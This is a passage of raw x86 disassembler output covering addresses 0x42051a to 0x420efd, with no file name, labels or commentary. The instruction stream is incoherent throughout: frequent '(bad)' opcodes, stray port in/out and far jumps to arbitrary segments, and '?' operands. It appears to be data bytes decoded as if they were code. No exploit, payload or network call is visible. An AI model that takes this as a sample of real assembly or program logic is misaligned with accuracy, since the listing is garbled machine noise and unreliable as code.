  42051a:	jle    0x4204a6
  42051c:	xchg   esp,eax
  42051d:	mov    eax,ds:0xecebef27
  420522:	lods   eax,DWORD PTR ds:[esi]
  420523:	dec    ebx
  420524:	aas    
  420525:	(bad)  
  420526:	dec    ecx
  420527:	dec    eax
  420528:	push   esp
  420529:	shl    DWORD PTR [di+0x29],cl
  42052d:	jecxz  0x42051e
  42052f:	out    0xac,eax
  420531:	in     eax,dx
  420532:	lds    edi,FWORD PTR [edi-0x63]
  420535:	inc    edx
  420536:	sub    ebp,ebp
  420538:	fstp   QWORD PTR [esi+ecx*4]
  42053b:	fisub  WORD PTR [ebp+ebx*2+0x18]
  42053f:	xor    cl,BYTE PTR [ebx-0x3e]
  420542:	out    dx,eax
  420543:	xor    DWORD PTR [eax+0x57],esi
  420546:	sbb    ch,BYTE PTR [edi+0x413a78b3]
  42054c:	xor    DWORD PTR [edi-0x2a],ecx
  42054f:	adc    al,0xa3
  420551:	add    BYTE PTR [ebp+0x2a55be9],ch
  420557:	shl    eax,0x4c
  42055a:	cmp    bl,BYTE PTR [eax-0x76b48a6d]
  420560:	xlat   BYTE PTR ds:[ebx]
  420561:	int    0xe3
  420563:	fld    QWORD PTR [ebx-0x14]
  420566:	jo     0x42058c
  420568:	pop    esp
  420569:	add    BYTE PTR [ebp-0x28],ch
  42056c:	pop    ebx
  42056d:	mov    al,ds:0x56d1390
  420572:	or     al,0xbb
  420574:	out    0x73,eax
  420576:	mov    ecx,0x85cfa8ce
  42057b:	pop    ds
  42057c:	out    dx,eax
  42057d:	pop    ss
  42057e:	xor    al,0x9
  420581:	pop    ebp
  420582:	xchg   eax,ecx
  420584:	mov    ebx,0x2a2c912e
  420589:	bound  eax,QWORD PTR [edi+0x72]
  42058c:	retf   
  42058d:	scas   eax,DWORD PTR es:[edi]
  42058e:	aas    
  42058f:	mov    ?,esp
  420591:	jbe    0x4205a0
  420593:	inc    ebx
  420594:	mov    esi,0x2374eab7
  420599:	stc    
  42059a:	fiadd  WORD PTR [esi+0x29b15586]
  4205a0:	mov    esp,DWORD PTR [eax+0x66]
  4205a3:	pop    edx
  4205a4:	fst    DWORD PTR [edx-0x6f]
  4205a7:	test   eax,0xe7eed25b
  4205ac:	dec    eax
  4205ad:	or     ebx,DWORD PTR [ebp+0xa]
  4205b0:	pop    ebx
  4205b1:	cmp    esi,DWORD PTR [eax]
  4205b3:	xchg   BYTE PTR [ebp-0x74f88798],ah
  4205b9:	in     al,0x40
  4205bb:	nop
  4205bc:	pop    esi
  4205bd:	jne    0x42054b
  4205bf:	aad    0x64
  4205c1:	jne    0x4205b7
  4205c3:	gs jmp 0x420582
  4205c6:	xlat   BYTE PTR ds:[ebx]
  4205c7:	push   es
  4205c8:	fnstsw WORD PTR [esi-0x55]
  4205cb:	lahf   
  4205cc:	ret    0x5dba
  4205cf:	out    dx,al
  4205d0:	mov    dl,0x75
  4205d2:	xchg   ebp,eax
  4205d3:	xor    ebp,DWORD PTR [edx+0x18]
  4205d6:	xchg   ah,cl
  4205d8:	xor    al,0xec
  4205da:	lahf   
  4205db:	ror    BYTE PTR [eax],cl
  4205dd:	arpl   WORD PTR [edx+ebx*4-0x66],sp
  4205e1:	lahf   
  4205e2:	bound  edi,QWORD PTR [ecx+0x3bcd079]
  4205e8:	call   0x2925:0x1901d428
  4205ef:	sbb    DWORD PTR [ecx],edi
  4205f1:	dec    esi
  4205f2:	xchg   edx,eax
  4205f3:	repz dec eax
  4205f5:	lods   eax,DWORD PTR ds:[esi]
  4205f6:	and    ecx,esp
  4205f8:	(bad)
  4205fb:	xchg   BYTE PTR [ebx+0x1067fe4b],cl
  420601:	xchg   esp,eax
  420603:	pop    esi
  420604:	pop    ss
  420605:	(bad)  
  420606:	xor    eax,0x54e8b65e
  42060b:	sti    
  42060c:	repnz xor al,BYTE PTR [edx]
  42060f:	mov    edx,0x0
	...
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	xchg   ecx,eax
  420681:	lahf   
  420682:	dec    si
  420684:	lock pop eax
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	dec    ebx
  42068d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42068e:	or     BYTE PTR [ecx+0x4e],bh
  420691:	retf   0x37cf
  420694:	pop    eax
  420695:	shl    BYTE PTR [ebp-0x69ffafe3],0x9e
  42069c:	dec    eax
  42069d:	dec    edx
  42069e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42069f:	xor    DWORD PTR [esi+0x2e],0xdd9f8129
  4206a6:	rol    BYTE PTR gs:[eax-0x49a7dca0],cl
  4206ad:	lock cmp eax,0xf26ce5c
  4206b3:	popa   
  4206b4:	fmul   st,st(3)
  4206b6:	sahf   
  4206b7:	fcomp  DWORD PTR [edx+0x6e4e366]
  4206bd:	adc    BYTE PTR [edx+0x3e],bl
  4206c0:	std    
  4206c1:	dec    edi
  4206c2:	or     BYTE PTR [ecx],0xfa
  4206c5:	xor    al,0xb3
  4206c7:	inc    ecx
  4206c8:	stos   DWORD PTR es:[edi],eax
  4206c9:	adc    dl,ch
  4206cb:	and    BYTE PTR [eax],dl
  4206cd:	shr    bl,0xa2
  4206d0:	test   DWORD PTR [esp+eax*1],eax
  4206d3:	mov    cl,0xe8
  4206d5:	pop    edi
  4206d6:	mov    esp,0xd7f89033
  4206db:	mov    ebx,0x117a8ef1
  4206e0:	iret   
  4206e1:	and    ebp,esi
  4206e3:	sahf   
  4206e4:	pop    ss
  4206e5:	xlat   BYTE PTR ds:[ebx]
  4206e6:	loop   0x4206bc
  4206e8:	(bad)  
  4206e9:	stos   DWORD PTR es:[edi],eax
  4206ea:	daa    
  4206eb:	cld    
  4206ec:	adc    ecx,DWORD PTR [ebx+0x48]
  4206ef:	jnp    0x42068d
  4206f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206f2:	test   BYTE PTR [ebp-0x3c],ch
  4206f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206f6:	lahf   
  4206f7:	ss shr ebp,0xe7
  4206fb:	out    0x9d,eax
  4206fd:	push   0x50f6fc51
  420702:	sub    eax,DWORD PTR [edi-0x466265c0]
  420708:	xchg   BYTE PTR [ebp+0x10c0bcd5],ch
  42070e:	clc    
  42070f:	(bad)  
  420710:	aam    0x94
  420712:	std    
  420713:	in     eax,0x54
  420715:	push   cs
  420716:	ret    0x20b7
  420719:	data16 aad 0x9d
  42071c:	lahf   
  42071d:	adc    eax,ecx
  42071f:	push   esp
  420720:	out    0x5b,eax
  420722:	stc    
  420723:	ja     0x420709
  420725:	inc    ebp
  420726:	inc    ecx
  420727:	mov    WORD PTR [ebp-0xf],?
  42072a:	in     al,0xc6
  42072c:	ror    BYTE PTR [edx],cl
  42072e:	xor    eax,0xc297e0fc
  420733:	mov    ebx,DWORD PTR [ebp+0x38]
  420736:	pushf  
  420737:	ja     0x4206fc
  420739:	in     al,0x19
  42073b:	inc    edx
  42073c:	adc    BYTE PTR [esp+edx*8-0xd9ae47b],al
  420743:	push   edx
  420744:	jmp    0x4207b4
  420746:	and    al,0xf8
  420748:	add    BYTE PTR [ebx],bl
  42074a:	jmp    0xf633:0x6b0c9b68
  420751:	jle    0x420728
  420753:	test   BYTE PTR [ecx],ah
  420755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420756:	les    eax,FWORD PTR [ecx+0x53]
  420759:	pop    ebx
  42075a:	or     al,0x51
  42075c:	sub    dh,ah
  42075e:	fdivp  st(0),st
  420760:	loope  0x42075f
  420762:	ins    DWORD PTR es:[edi],dx
  420763:	pop    ss
  420764:	(bad)  
  420766:	cmc    
  420767:	into   
  420768:	add    DWORD PTR [esi-0x7d25fb43],0xcd3bb439
  420772:	in     al,0x2b
  420774:	ds stos BYTE PTR es:[edi],al
  420776:	pusha  
  420777:	pop    es
  420778:	jge    0x420738
  42077a:	div    DWORD PTR [ebx+ecx*4-0x12b921e6]
  420781:	nop
  420782:	jmp    0x420741
  420784:	aam    0xb6
  420786:	adc    al,0xd2
  420788:	sar    BYTE PTR [edi-0x43fe0de0],0x3e
  42078f:	jmp    0x0:0x0
	...
  4207f2:	add    BYTE PTR [eax],al
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	out    dx,al
  420801:	lock xchg ecx,eax
  420803:	push   ss
  420804:	hlt    
  420805:	pop    ecx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	xchg   esp,eax
  42080d:	push   0x19
  42080f:	je     0x420862
  420811:	test   BYTE PTR [eax],bl
  420813:	dec    ecx
  420814:	std    
  420815:	stos   BYTE PTR es:[edi],al
  420816:	stc    
  420817:	outs   dx,BYTE PTR ds:[esi]
  420818:	push   es
  420819:	pop    ss
  42081a:	xchg   ebx,eax
  42081b:	adc    ch,bh
  42081d:	xor    ah,ch
  42081f:	lods   al,BYTE PTR ds:[esi]
  420820:	xchg   DWORD PTR [ebx+0x322b523b],esp
  420826:	popa   
  420827:	inc    ebp
  420828:	jnp    0x420874
  42082a:	int3   
  42082b:	inc    ebp
  42082c:	xor    edx,DWORD PTR [ebp+0x24]
  42082f:	pop    edi
  420830:	call   0xca0a3122
  420835:	sti    
  420836:	(bad)  
  420837:	shl    ebp,1
  420839:	inc    esp
  42083a:	add    BYTE PTR [ecx],0xfa
  42083d:	jnp    0x42084e
  42083f:	mov    dh,0xab
  420841:	mov    dl,dh
  420843:	ret    0x4337
  420846:	lahf   
  420847:	mov    al,ds:0xf6651ee4
  42084c:	jmp    0x7ee2:0xfef7abc0
  420853:	mov    eax,0x8523b64d
  420858:	cli    
  420859:	cmp    ebx,DWORD PTR [ebx-0x437d3f13]
  42085f:	addr16 nop
  420861:	sbb    bh,BYTE PTR [edi-0x51a795b]
  420867:	shl    BYTE PTR [esi+0x40],0x87
  42086b:	pop    es
  42086c:	adc    eax,0x9457d695
  420871:	call   0xae3916b6
  420876:	cmc    
  420877:	jo     0x42081e
  420879:	test   eax,0xbe8a5141
  42087e:	out    dx,eax
  42087f:	push   es
  420880:	sahf   
  420881:	cs add al,0xe7
  420884:	mov    al,0x60
  420886:	jle    0x42085e
  420888:	jmp    0x1dd9:0xf83226b4
  42088f:	xlat   BYTE PTR ds:[ebx]
  420890:	cdq    
  420891:	int    0xf5
  420893:	mov    esp,0x91801a65
  420898:	xchg   ebx,eax
  420899:	or     BYTE PTR [edi+0x6f],ah
  42089c:	dec    ebp
  42089d:	sub    ah,BYTE PTR [ebx-0x7eaeb88]
  4208a3:	and    edx,edx
  4208a5:	aam    0x27
  4208a7:	lea    edx,[esi-0x44a2a22c]
  4208ad:	mov    ch,0xbe
  4208af:	dec    esp
  4208b0:	mov    WORD PTR [ebx-0x13],?
  4208b3:	jge    0x42092f
  4208b5:	mov    cl,0x20
  4208b7:	xchg   DWORD PTR [ebx-0x28635f94],esi
  4208bd:	jns    0x420912
  4208bf:	lea    esp,[ebp-0x11]
  4208c2:	sub    BYTE PTR [esp+edx*2+0xb],ah
  4208c6:	call   FWORD PTR [ebp+0x33]
  4208c9:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4208cb:	sub    DWORD PTR [edi-0x5dc25927],esi
  4208d1:	inc    ebx
  4208d2:	mov    eax,0xd7619b1d
  4208d7:	(bad)  
  4208d9:	jo     0x4208a7
  4208db:	jmp    FWORD PTR [ecx+0x7c]
  4208de:	push   eax
  4208df:	mov    eax,ds:0x8a78fb8e
  4208e4:	sbb    BYTE PTR [edi+0x821ee62],0x15
  4208eb:	lods   eax,DWORD PTR ds:[esi]
  4208ec:	test   al,0x84
  4208ee:	stc    
  4208ef:	sbb    dh,0x52
  4208f2:	ss out dx,eax
  4208f4:	repz aaa 
  4208f6:	es add al,0x41
  4208f9:	mov    ecx,0x8a9255c2
  4208fe:	mov    ?,WORD PTR [ebp+0x34]
  420901:	push   ds
  420902:	dec    ebp
  420903:	mov    eax,ds:0x319f2b57
  420908:	push   0x41af78ef
  42090d:	and    esi,0x4a
	...
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xa5
  420981:	and    ecx,DWORD PTR [esi]
  420983:	jmp    0x104:0x15af8
  42098a:	add    BYTE PTR [eax],al
  42098c:	sahf   
  42098d:	(bad)  
  42098e:	aaa    
  42098f:	fisubr WORD PTR [eax+0x2d]
  420992:	mov    esi,edx
  420994:	test   eax,eax
  420996:	mov    cl,0xef
  420998:	fiadd  DWORD PTR [edi-0x23]
  42099b:	lds    ecx,FWORD PTR [edx-0xd3da45d]
  4209a1:	mov    ch,0x45
  4209a3:	mov    esi,0x334fb5bc
  4209a8:	inc    eax
  4209a9:	inc    ebx
  4209aa:	mov    edx,0xc857c80
  4209af:	js     0x4209b9
  4209b1:	(bad)  
  4209b2:	jmp    0xcd68:0x2340fc0c
  4209b9:	mov    ds:0x92b4757b,eax
  4209be:	in     al,dx
  4209bf:	das    
  4209c0:	test   DWORD PTR [eax+0x39],esp
  4209c3:	add    bl,BYTE PTR [ecx+0x7a]
  4209c6:	sbb    al,0x28
  4209c8:	jae    0x4209be
  4209ca:	lea    edi,[ebx-0x69]
  4209cd:	call   0xa857:0xf9670c34
  4209d4:	mov    ah,0x95
  4209d6:	out    dx,eax
  4209d7:	fucom  st(7)
  4209d9:	cli    
  4209da:	xor    eax,0x758c1bb3
  4209df:	jmp    0x85ff916
  4209e4:	cmp    DWORD PTR [edx+0x69aabd3a],0xbf75756b
  4209ee:	sub    BYTE PTR ds:0x7128384e,cl
  4209f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209f5:	scas   al,BYTE PTR es:[edi]
  4209f6:	js     0x420a11
  4209f8:	dec    esi
  4209f9:	or     ch,0xf5
  4209fc:	dec    esp
  4209fd:	xchg   ebx,eax
  4209fe:	adc    DWORD PTR [esi-0x31],esp
  420a01:	lds    ecx,FWORD PTR cs:[esi+0x30]
  420a05:	ret    
  420a06:	jmp    0x35561159
  420a0b:	dec    ecx
  420a0c:	je     0x420a33
  420a0e:	data16 fnstsw WORD PTR [edx]
  420a11:	cmp    dl,BYTE PTR [ebp+0x6eb92d77]
  420a17:	sub    edi,DWORD PTR [ebp+edx*2+0x4f5e1a9f]
  420a1e:	mov    ebp,0x3bdb3276
  420a23:	jb     0x420a4f
  420a25:	jl     0x420a7f
  420a27:	out    dx,al
  420a28:	inc    eax
  420a29:	sub    eax,0x98052d69
  420a2e:	or     DWORD PTR [eax],esp
  420a30:	or     DWORD PTR [esi+0x15],esp
  420a33:	adc    ecx,DWORD PTR [ebx+0x5a5fc3a3]
  420a39:	cmp    al,0x6
  420a3b:	nop
  420a3c:	fisub  WORD PTR [ebp+0x3fcb113a]
  420a42:	or     bh,BYTE PTR [esi-0x2a]
  420a45:	out    dx,al
  420a46:	jne    0x420ac2
  420a48:	jle    0x4209f8
  420a4a:	fld    st(4)
  420a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a4d:	rcr    esp,1
  420a4f:	inc    edx
  420a50:	ja     0x420a7f
  420a52:	(bad)  
  420a53:	mov    al,ds:0x54cb603e
  420a58:	shl    DWORD PTR [edx+0x771cd426],cl
  420a5e:	fucomip st,st(0)
  420a60:	scas   al,BYTE PTR es:[edi]
  420a61:	mov    eax,0x2535035d
  420a66:	pop    eax
  420a67:	xchg   ebp,eax
  420a68:	stos   DWORD PTR es:[edi],eax
  420a69:	imul   ebx,ebx,0x6d7cc66a
  420a6f:	(bad)  
  420a70:	pop    esi
  420a71:	mov    WORD PTR [esi],fs
  420a73:	mul    DWORD PTR [eax]
  420a75:	sbb    BYTE PTR [ebx],cl
  420a77:	(bad)  
  420a78:	dec    ebp
  420a79:	jge    0x420a2c
  420a7b:	mov    eax,ds:0x5f565f6b
  420a80:	test   eax,0x11cb5da3
  420a85:	lock push eax
  420a87:	xlat   BYTE PTR ds:[ebx]
  420a88:	loope  0x420a1b
  420a8a:	lods   eax,DWORD PTR ds:[esi]
  420a8b:	test   al,0x1b
  420a8d:	jae    0x420a1d
  420a8f:	arpl   WORD PTR [eax],ax
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	idiv   BYTE PTR ss:[ebx]
  420b03:	cmp    edi,esp
  420b05:	pop    ebx
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	shl    BYTE PTR [esi],cl
  420b0e:	inc    ecx
  420b0f:	int3   
  420b10:	jg     0x420b71
  420b12:	or     edi,ebx
  420b14:	cmp    ebx,DWORD PTR [ecx+0x75e67ea6]
  420b1a:	out    0x91,eax
  420b1c:	push   ss
  420b1d:	push   edx
  420b1e:	hlt    
  420b1f:	and    DWORD PTR [ecx+0x5e267a72],esi
  420b25:	xlat   BYTE PTR ds:[ebx]
  420b26:	add    esi,edx
  420b28:	addr16 ja 0x420af4
  420b2b:	fmul   QWORD PTR [ebp+0x73861d94]
  420b31:	(bad)  
  420b32:	std    
  420b33:	aad    0xf0
  420b35:	mov    ecx,0xcdf65bfc
  420b3a:	push   cs
  420b3b:	jmp    0x420ad4
  420b3d:	ficomp WORD PTR [esi+0x7bac2f72]
  420b43:	or     BYTE PTR [ebx],cl
  420b45:	add    ebx,DWORD PTR [esp+eiz*8+0x56]
  420b49:	cwde   
  420b4a:	imul   edi,DWORD PTR [edx-0x7b],0xffffffb0
  420b4e:	mov    eax,ds:0x5fb119c
  420b53:	adc    BYTE PTR [edx-0x50dbea95],dl
  420b59:	lahf   
  420b5a:	cmc    
  420b5b:	dec    ebp
  420b5c:	cmc    
  420b5d:	shl    DWORD PTR [edx+eax*2],0xee
  420b61:	push   0xa6cb645b
  420b66:	fs mov cl,0x7
  420b69:	jmp    0x7fee5fda
  420b6e:	mov    esi,0x3baf49d
  420b73:	sub    al,0x96
  420b75:	or     eax,0xb2f581f4
  420b7a:	(bad)  
  420b7b:	mov    ecx,0xe180c39c
  420b80:	div    DWORD PTR [ebp-0x7f]
  420b83:	loopne 0x420c01
  420b85:	sbb    DWORD PTR [ecx+0x29],ebx
  420b88:	sbb    eax,0x4630f4f5
  420b8d:	leave  
  420b8e:	ja     0x420bc2
  420b90:	or     al,0x41
  420b92:	or     eax,0x416a9dbf
  420b97:	in     eax,0xff
  420b99:	ss (bad) 
  420b9b:	pop    ds
  420b9c:	jl     0x420bbc
  420b9e:	push   edx
  420b9f:	xchg   esp,eax
  420ba0:	mov    bl,0xd4
  420ba2:	into   
  420ba3:	jo     0x420bd6
  420ba5:	nop
  420ba6:	(bad)
  420baa:	push   edi
  420bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bac:	inc    esp
  420bad:	fwait
  420bae:	or     ecx,ecx
  420bb0:	inc    ebx
  420bb1:	adc    eax,0xeb4328ba
  420bb6:	pop    eax
  420bb7:	scas   eax,DWORD PTR es:[edi]
  420bb8:	jmp    0xbcc33658
  420bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bbe:	gs mov bl,0xf7
  420bc1:	jno    0x420c14
  420bc3:	sbb    eax,0x2506df9d
  420bc8:	in     al,0xd0
  420bca:	cmp    BYTE PTR [esi-0x53],ch
  420bcd:	pop    eax
  420bce:	(bad)  
  420bcf:	hlt    
  420bd0:	pop    edx
  420bd1:	adc    eax,0xc90e53a3
  420bd6:	mov    dh,0x2c
  420bd8:	and    ebp,DWORD PTR [ebx+0x715e08a8]
  420bde:	test   al,0x6d
  420be0:	jo     0x420c29
  420be2:	es enter 0x3bb0,0x5f
  420be7:	jp     0x420bac
  420be9:	sbb    eax,0x3fac6101
  420bee:	inc    ebp
  420bef:	jb     0x420bab
  420bf1:	sbb    BYTE PTR [esi+ecx*4-0x33],al
  420bf5:	(bad)  
  420bf6:	adc    eax,0x171fa3de
  420bfb:	jg     0x420bfe
  420bfd:	or     eax,0x61c55a12
  420c02:	jle    0x420ba7
  420c04:	push   ebx
  420c05:	in     al,dx
  420c06:	fidivr DWORD PTR [edx+0x32]
  420c09:	jno    0x420c29
  420c0b:	cmp    DWORD PTR [eax+0x7d],edi
  420c0e:	fsub   QWORD PTR [edx+0x0]
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	pop    es
  420c81:	adc    BYTE PTR [edi+eiz*1],cl
  420c84:	add    BYTE PTR [ebp+0x1],bl
  420c87:	add    BYTE PTR [ecx+eax*1],al
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	cmp    esp,DWORD PTR [ebx]
  420c8e:	icebp  
  420c8f:	push   edi
  420c90:	stc    
  420c91:	cmp    al,0x97
  420c93:	(bad)  
  420c95:	jmp    0x8d4e:0x730ea18d
  420c9c:	or     edi,edx
  420c9e:	push   ss
  420c9f:	push   0x7f
  420ca1:	fimul  DWORD PTR [eax-0x56]
  420ca4:	ins    DWORD PTR es:[edi],dx
  420ca5:	mov    eax,0x6eb3f908
  420caa:	repz xor BYTE PTR [esi],ch
  420cad:	or     al,0x80
  420caf:	or     al,0xda
  420cb1:	pop    edx
  420cb2:	fidivr WORD PTR [ecx]
  420cb4:	mov    al,ds:0x9f1af5c8
  420cb9:	retf   0x8c9d
  420cbc:	sub    ch,bh
  420cbe:	inc    ecx
  420cbf:	add    eax,0xe6c86563
  420cc4:	add    ah,ah
  420cc6:	outs   dx,DWORD PTR ds:[esi]
  420cc7:	ficomp DWORD PTR [edx+0x5814b8e7]
  420ccd:	dec    edx
  420cce:	push   edx
  420ccf:	arpl   WORD PTR ds:0x8837d2f2,bx
  420cd5:	add    al,0x61
  420cd7:	push   eax
  420cd8:	adc    al,0x82
  420cda:	push   esp
  420cdb:	ins    BYTE PTR es:[edi],dx
  420cdc:	mov    WORD PTR [eax-0x498612d9],?
  420ce2:	rol    BYTE PTR [ebx-0x3a7e52ac],cl
  420ce8:	ins    DWORD PTR es:[edi],dx
  420ce9:	push   edx
  420cea:	pop    edi
  420ceb:	jo     0x420cf5
  420ced:	loopne 0x420cae
  420cef:	and    ebx,ebx
  420cf1:	sbb    al,0xb5
  420cf3:	adc    DWORD PTR [edx+0x658fda12],0x9c22ccdc
  420cfd:	dec    esi
  420cfe:	sub    BYTE PTR [ecx-0x8],0x1f
  420d02:	push   eax
  420d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d04:	sbb    eax,0x3e722205
  420d09:	sbb    al,0x5a
  420d0b:	jl     0x420cf5
  420d0d:	cmc    
  420d0e:	(bad)  
  420d0f:	sar    BYTE PTR [edx-0x12],1
  420d12:	cld    
  420d13:	repz mov eax,0x1e1dd3f5
  420d19:	fcomp  QWORD PTR [esi+0x1f37da2b]
  420d1f:	iret   
  420d20:	leave  
  420d21:	inc    esi
  420d22:	mov    dl,0xb0
  420d24:	inc    ebx
  420d25:	(bad)  
  420d27:	mov    ah,0x6e
  420d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d2a:	mov    eax,DWORD PTR [ebp+eax*8+0x100d7852]
  420d31:	ds xchg ebp,eax
  420d33:	out    0x9f,eax
  420d35:	out    dx,eax
  420d36:	push   ecx
  420d37:	inc    esi
  420d38:	das    
  420d39:	stos   BYTE PTR es:[edi],al
  420d3a:	xor    dh,al
  420d3c:	sbb    DWORD PTR [eax+0x7cd92d1c],ebx
  420d42:	pop    edi
  420d43:	cli    
  420d44:	int3   
  420d45:	xor    al,0xa1
  420d47:	push   edx
  420d48:	jmp    0xfb1c:0x60b96273
  420d4f:	shl    DWORD PTR [ebp+ebp*1-0x4bb3d1fb],0xf0
  420d57:	dec    ebx
  420d58:	xchg   ebp,eax
  420d59:	pop    esp
  420d5a:	cmp    BYTE PTR [ebp+esi*2-0x30],dh
  420d5e:	inc    eax
  420d5f:	dec    ecx
  420d60:	ss or  al,0xf6
  420d63:	in     al,0x64
  420d65:	bound  esp,QWORD PTR [edi-0x7adc50ff]
  420d6b:	add    dh,al
  420d6d:	jae    0x420d47
  420d6f:	ja     0x420d5c
  420d71:	sub    eax,0xd395ec1a
  420d76:	push   ds
  420d77:	outs   dx,DWORD PTR ds:[esi]
  420d78:	mov    eax,ds:0x9eee1fba
  420d7d:	fldcw  WORD PTR [ebp+ebx*4+0x60856877]
  420d84:	adc    DWORD PTR [edi+0x52],edi
  420d87:	sbb    al,0x48
  420d89:	ret    0xb6f2
  420d8c:	or     al,ch
  420d8e:	inc    esi
  420d8f:	push   ecx
	...
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xf0e122aa
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	adc    BYTE PTR [edi+0x7b],ch
  420e0f:	fsubr  DWORD PTR [edi+0x4c45a6ac]
  420e15:	into   
  420e16:	in     eax,0x3a
  420e18:	adc    esp,eax
  420e1a:	dec    edi
  420e1b:	lods   eax,DWORD PTR ds:[esi]
  420e1c:	sbb    DWORD PTR [edi+esi*1-0xd],ebx
  420e20:	sbb    ebx,edi
  420e22:	mov    ah,bh
  420e24:	dec    ecx
  420e25:	cmp    eax,0xfb8abaa0
  420e2a:	jg     0x420e9b
  420e2c:	add    eax,DWORD PTR [edx+0x51c77479]
  420e32:	xchg   esp,eax
  420e33:	leave  
  420e34:	adc    ebx,eax
  420e36:	xchg   edi,eax
  420e37:	pop    es
  420e38:	aaa    
  420e39:	xchg   BYTE PTR [ecx+0x3f136bd5],cl
  420e3f:	retf   0xad0
  420e42:	pop    edi
  420e43:	mov    ebp,DWORD PTR ds:0xb038b0b6
  420e49:	ret    
  420e4a:	cwde   
  420e4b:	dec    ecx
  420e4d:	jmp    0x420ece
  420e4f:	or     DWORD PTR gs:[eax+0x4a],ebp
  420e53:	inc    esi
  420e54:	and    ecx,esp
  420e56:	jle    0x420de9
  420e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e59:	ror    BYTE PTR [edi],cl
  420e5b:	fstp   QWORD PTR [ebp+0x75f269e3]
  420e61:	repnz ficomp WORD PTR [edi]
  420e64:	(bad)  
  420e65:	stos   BYTE PTR es:[edi],al
  420e66:	(bad)  
  420e67:	push   ss
  420e68:	inc    edi
  420e69:	cwde   
  420e6a:	fucomi st,st(6)
  420e6c:	cdq    
  420e6d:	fcom   DWORD PTR [eax-0x6c]
  420e70:	or     ch,BYTE PTR [ecx-0x26acbf32]
  420e76:	fld    DWORD PTR ds:0x36051967
  420e7c:	cvtps2pi mm2,QWORD PTR [esp+edi*1]
  420e80:	push   eax
  420e81:	xor    al,0x79
  420e83:	dec    esi
  420e84:	push   eax
  420e85:	pop    ss
  420e86:	push   cs
  420e87:	mov    BYTE PTR [edx+0x3c634923],al
  420e8d:	add    ch,dh
  420e8f:	into   
  420e90:	and    esi,DWORD PTR [edi+esi*4]
  420e93:	cmp    esi,eax
  420e95:	inc    ebx
  420e96:	mov    BYTE PTR [edx],bh
  420e98:	dec    ebx
  420e99:	sub    ecx,ebp
  420e9b:	fsub   DWORD PTR [edx-0x7f]
  420e9e:	fadd   DWORD PTR [ebp+0x764f590b]
  420ea4:	jbe    0x420ecb
  420ea6:	and    BYTE PTR [esi+0x3c701e0d],bh
  420eac:	scas   al,BYTE PTR es:[edi]
  420ead:	push   ebp
  420eae:	out    dx,al
  420eaf:	sub    eax,0xab2c7fe4
  420eb4:	scas   al,BYTE PTR es:[edi]
  420eb5:	push   ebp
  420eb6:	mov    al,ds:0x441a0dd1
  420ebb:	test   BYTE PTR [ecx-0x23],bl
  420ebe:	sti    
  420ebf:	(bad)  
  420ec0:	(bad)
  420ec3:	mov    WORD PTR [ecx-0x36],cs
  420ec6:	arpl   ax,si
  420ec8:	loopne 0x420f09
  420eca:	popa   
  420ecb:	aam    0xf9
  420ecd:	jo     0x420f4b
  420ecf:	(bad)  
  420ed0:	xrelease xchg DWORD PTR [ebx],ecx
  420ed3:	mov    BYTE PTR [ecx],al
  420ed5:	pop    ds
  420ed6:	fisttp DWORD PTR [ebx]
  420ed8:	aad    0xb4
  420eda:	imul   ecx,DWORD PTR [esi],0xffffff94
  420edd:	dec    ebp
  420ede:	dec    esi
  420edf:	push   esi
  420ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ee1:	stc    
  420ee2:	sbb    BYTE PTR [eax],dh
  420ee4:	les    edx,FWORD PTR [edx-0x68c7556e]
  420eea:	xchg   esi,eax
  420eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eec:	dec    esp
  420eed:	xor    dh,BYTE PTR [esi]
  420eef:	ins    BYTE PTR es:[edi],dx
  420ef0:	adc    BYTE PTR [edi-0x4b],bl
  420ef3:	sbb    edi,DWORD PTR [ebx-0x72d50069]
  420ef9:	neg    al
  420efb:	push   ebp
  420efc:	pop    esi
  420efd:	dec    ebp
